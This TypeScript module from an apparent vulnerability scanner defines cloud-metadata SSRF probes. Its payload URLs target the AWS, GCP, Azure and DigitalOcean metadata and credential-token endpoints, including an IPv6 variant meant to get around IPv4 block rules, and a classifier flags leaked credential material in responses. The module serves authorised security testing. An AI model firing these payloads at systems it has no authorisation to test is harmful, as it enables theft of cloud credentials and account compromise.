// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'cloud-metadata-attack',
  family: 'cve-named',
  title: 'Cloud metadata SSRF (IMDSv1 / GCP / Azure / DigitalOcean)',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['query', 'body', 'json', 'header'],
  expectedSignals: ['metadata-content-returned', 'credential-leaked', 'status-delta'],
  cwe: [918],
};

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'cloud-imdsv1-aws',
      family: 'cve-named',
      value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      encoding: 'url',
      intent: 'AWS IMDSv1 IAM credentials endpoint — returns role-specific credential JSON',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned', 'credential-leaked'],
    },
    {
      id: 'cloud-imdsv1-ami',
      family: 'cve-named',
      value: 'http://169.254.169.254/latest/meta-data/',
      encoding: 'url',
      intent: 'AWS IMDSv1 base metadata endpoint — fingerprints cloud environment',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned'],
    },
    {
      id: 'cloud-gcp-metadata',
      family: 'cve-named',
      value: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
      encoding: 'url',
      intent: 'GCP metadata service access token endpoint',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned', 'credential-leaked'],
    },
    {
      id: 'cloud-azure-metadata',
      family: 'cve-named',
      value: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
      encoding: 'url',
      intent: 'Azure IMDS instance metadata endpoint',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned'],
    },
    {
      id: 'cloud-do-metadata',
      family: 'cve-named',
      value: 'http://169.254.169.254/metadata/v1/interfaces/',
      encoding: 'url',
      intent: 'DigitalOcean droplet metadata endpoint',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned'],
    },
    {
      id: 'cloud-imdsv2-token',
      family: 'cve-named',
      value: 'http://169.254.169.254/latest/api/token',
      encoding: 'url',
      intent: 'AWS IMDSv2 token endpoint — if accessible without TTL header, IMDSv1 also active',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned'],
    },
    {
      id: 'cloud-link-local-ipv6',
      family: 'cve-named',
      value: 'http://[fd00:ec2::254]/latest/meta-data/',
      encoding: 'url',
      intent: 'AWS IPv6 link-local metadata endpoint (bypass for IPv4 block rules)',
      destructiveRisk: 'none',
      expectedSignals: ['metadata-content-returned'],
    },
  ];
}

const METADATA_PATTERNS = [
  'ami-id', 'instance-id', 'security-credentials', 'accesskeyid', 'secretaccesskey',
  'computemetadata', 'service-accounts', 'access_token', 'azure', 'subscription',
  'droplet_id', 'interfaces', '169.254', 'metadata',
];

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  _baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const bodyLower = resp.bodyText.toLowerCase();
  const matchedPattern = METADATA_PATTERNS.find((p) => bodyLower.includes(p));
  const credentialLeak = bodyLower.includes('accesskeyid') || bodyLower.includes('secretaccesskey') ||
    bodyLower.includes('access_token') || bodyLower.includes('token_type');

  if (credentialLeak) {
    responseClass = 'expected-proof';
    confidence = 0.99;
    nextAction = 'promote-finding';
    evidence.push('Cloud credential material returned via SSRF to metadata endpoint — critical finding');
    evidence.push(`Matched pattern in response body`);
  } else if (matchedPattern) {
    responseClass = 'expected-proof';
    confidence = 0.88;
    nextAction = 'promote-finding';
    evidence.push(`Cloud metadata SSRF: metadata content returned — matched pattern: "${matchedPattern}"`);
  } else if (resp.statusCode === 200 && resp.bodyText.length > 20) {
    responseClass = 'observed-value';
    confidence = 0.4;
    nextAction = 'confirm';
    evidence.push(`SSRF target returned 200 with body — manual review for metadata content (variant: ${variant.id})`);
  } else {
    nextAction = 'continue';
    evidence.push(`No metadata content in response for ${variant.id}`);
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
